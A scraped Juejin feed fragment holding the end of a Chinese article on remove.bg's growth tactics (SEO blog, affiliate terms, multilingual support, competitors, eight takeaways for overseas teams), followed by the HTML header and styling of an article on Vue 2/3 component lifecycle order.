<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7afb2b9f85e84fa7926a50bf8d04d082~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=Yawag9GX7aEYQstxyALIkna1eHQ%3D" alt="" loading="lazy"/></p>
<p>然后就是它为每一种用户场景都做了内页，你是设计师、工程师、Photoshop 人员等等，都做了内页。这是真正从用户的角度去做需求，深刻调研自己的用户、客户，做好分类，做精致的产品，这点我是需要反思和学习的。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ab43fa97bba14eaa97c48326bd044edc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=YCCIRPnTWADP7h1XJq160gI3FE8%3D" alt="" loading="lazy"/></p>
<p>这是它的用户案例，每个用户的精彩故事都记录下来，对于一个产品来说，这是最有力的证言。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b9350eb2233a4f1caddcf84bc00a2840~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=y8yq8uLF47hu0vun0e5BFE%2BR6NE%3D" alt="" loading="lazy"/></p>
<p>然后是它的 blog 页面，作为工具站点，必须要写 blog，通过 blog 我们就看出 canva 这个团队的 SEO 功底了，基本上承接了所有 how-to、best xxx 等长尾需求流量，这也是我们必须要掌握的 SEO 技巧。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/46c82f85ba5547ae8a399f32e31569f2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=goy%2FDJhfytx90YTbOKaKkm0SD1o%3D" alt="" loading="lazy"/></p>
<p>而且随便点击去一篇博客，发现它是真正在用心写，从用户的角度去写，并不是为了 SEO 而 SEO。</p>
<h2 data-id="heading-9">10 增长工具：Newsletter + ProductHunt 小组件</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/231d85222d634769bed197eaae1ace58~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=7gCoksCQY%2F%2BE06Aqpr0o0Hnujoc%3D" alt="" loading="lazy"/></p>
<p>它的博客下方有 newsletter 的订阅，和 ProductHunt 的小组件，这个我觉得也是值得学习的点。我们真正做一个长期的产品，一定要做 EDM，一定要抓住任何可以提留存的机会。</p>
<h2 data-id="heading-10">11 Affiliate 体系：规则透明才好招募</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/afeea065aba842909257472839cdad52~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=Q3tVqxxIn0Gqajl9PkTfvZH9epQ%3D" alt="" loading="lazy"/></p>
<p>这是它的 Affliate 页面设计，这次我的产品也是被迫采用了 Affliate 的，最后发现 Affliate 真香。</p>
<p>你可以看到这里明确写了 Affliate 是 15%的收益，并且有很多 Affliate 相关的 faq，都非常专业，值得学习。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bc40708b03a245e89cc345d67a6e51e9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=wIsSypmtkWXmhM%2BXnTP447J%2FXm8%3D" alt="" loading="lazy"/></p>
<p>比如，remove.bg 是可以将用户订阅续费的收益，算作 Affliate 的，这点要清晰说明。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1b8317e7858341c4b2bfa5c83c2b3081~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=l%2BHaTEsEbWqoKsdgFkuDa8gaf3o%3D" alt="" loading="lazy"/></p>
<p>还有，哪些推广行为是不被允许的，这点要提前说明，一般我们不希望对方投流来影响我们自己的 seo 等等。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8a5fa57909274e13be91b3dc7cc4a9e9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=fd4TK%2FvSr5zGhK2GvMv3Mz1DA0M%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1836814955fa495fb243c57bc8f80d8c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=mQF%2BKA%2BGzWXksgaGCYOgrXI2tdU%3D" alt="" loading="lazy"/></p>
<p>收益结算周期、如果付费、cookie 追踪有效期什么的，都要清晰。</p>
<p>以上这些，都是我上个产品 Affliate 踩的坑，跟对方来回 20 多个邮件才把这个东西聊明白。</p>
<p>remove.bg 就非常值得学习，直接做个 Affliate 页面，所有的规则都清楚了，可以吸引更多客户来对你的产品进行分销。</p>
<h2 data-id="heading-11">12 多语言 &amp; 渠道矩阵</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c366de8f06f94aea82de3765d9b8cf65~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=9uKEZFBwBMFZDPjTVBqFyCHDs3o%3D" alt="" loading="lazy"/></p>
<p>另外就是它支持了基本上主流国家的语言，做海外站点，如果我们要面向全球 70 亿人口市场，多语言必不可少，可能带来几十倍的流量。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/16cbc622950b4b6db8c0446f7f5f53db~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=6wyFb4ZB2aoPkxf%2F7ovEI8AB1Jo%3D" alt="" loading="lazy"/></p>
<p>最后我们学习一下它的营销渠道，包括 Facebook、Instagram、Twitter、TikTok、Youtube、LinkedIn。</p>
<p>我就不一个个截图了，这基本上可以当做范例，我们做海外产品重点需要去做的品牌渠道。</p>
<h2 data-id="heading-12">13 竞争格局：大盘够大，仍有切口</h2>
<p>最后我们可以通过 SImilarWeb 去看看它的竞争者：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/105e3c8bc261410e91c6d74efd514310~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=TvDSpZt28MPaIGIvP1VXsLqyDIs%3D" alt="" loading="lazy"/></p>
<p>比如 pixelcut，这个站点有两千万的访问量，我们看它的搜索词：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d125e3247c394f4aa9c6e6de3d109aeb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=qUo7cSmvRy6XdTnqTnncg3wsNWA%3D" alt="" loading="lazy"/></p>
<p>是不是也是 background remover？还有 photoroom，也有两千万的访问量：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f77b70a6a387470ab95983670567eb7d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2f5YGlQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825467&amp;x-signature=yNtfqg64kNZJ8cu6jSlwcHXDHik%3D" alt="" loading="lazy"/></p>
<p>这说明什么？就算 remove.bg 已经非常厉害了，但这个市场盘子足够大，依然有其他的竞争者可以分到流量。</p>
<p>不可能有一个产品把所有的流量都吃光，能够在大盘子内占小比例，也是很大的流量了，这就是我们的出海机会。</p>
<p>这两个站产品做的咋样，他们的流量和用户又是什么分布，这里面的市场空间还有没有我们的商机？这些就留给大家的作业去分析了。</p>
<h2 data-id="heading-13">14 给出海团队的 8 个可落地要点</h2>
<ol>
<li>
<p>域名选需求词，品牌=需求。</p>
</li>
<li>
<p>TDH 写清价值主张，标题加 Free 钩子。</p>
</li>
<li>
<p>OG 图用 before/after，社媒即转化页。</p>
</li>
<li>
<p>首屏即工具，降低首次互动摩擦。</p>
</li>
<li>
<p>免费闭环先跑通，再做付费触发。</p>
</li>
<li>
<p>订阅 + 按量并行，价格梯度少而清晰。</p>
</li>
<li>
<p>FAQ 讲透规则，减少客服/拒付风险。</p>
</li>
<li>
<p>场景、功能、案例、博客做成内页矩阵，既 SEO 又教育用户。</p>
</li>
</ol>
<p>出海没那么神秘，好的产品套路都写在这些细节里。多拆解、多复盘，抓住大盘里的小切口，就有机会找到属于自己的红利。</p>
<p>好了，今天的分享就到这里，我们下期再见！</p>
<hr/>
<p>🚀 想要与更多AI爱好者交流，共同成长吗？</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FZ4k_5_waWJbRRo5lZBZmog" target="_blank" title="https://mp.weixin.qq.com/s/Z4k_5_waWJbRRo5lZBZmog" ref="nofollow noopener noreferrer">和一群志同道合的人，持续精进 AI 的每一天</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[vue2、vue3父子组件嵌套生命周期执行顺序]]></title>    <link>https://juejin.cn/post/7577201863725514752</link>    <guid>https://juejin.cn/post/7577201863725514752</guid>    <pubDate>2025-11-27T04:39:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7577201863725514752" data-draft-id="7576914798057046068" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="vue2、vue3父子组件嵌套生命周期执行顺序"/> <meta itemprop="keywords" content="前端,Vue.js"/> <meta itemprop="datePublished" content="2025-11-27T04:39:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="什么时候吃饭"/> <meta itemprop="url" content="https://juejin.cn/user/4235734789917406"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            vue2、vue3父子组件嵌套生命周期执行顺序
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4235734789917406/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    什么时候吃饭
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T04:39:36.000Z" title="Thu Nov 27 2025 04:39:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#2b2b2b;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(159,219,252,.15) 3%,transparent 0),linear-gradient(1turn,rgba(159,219,252,.15) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin-top:35px;margin-bottom:10px;color:#4dd0e1}.markdown-body h1{font-size:30px;text-align:center;position:relative;width:max-content;margin:0 auto}.markdown-body h1:before{position:absolute;content:"";z-index:-1;top:-20px;height:100%;width:100px;left:0;right:0;margin:0 auto;background:url(data:image/png;base64,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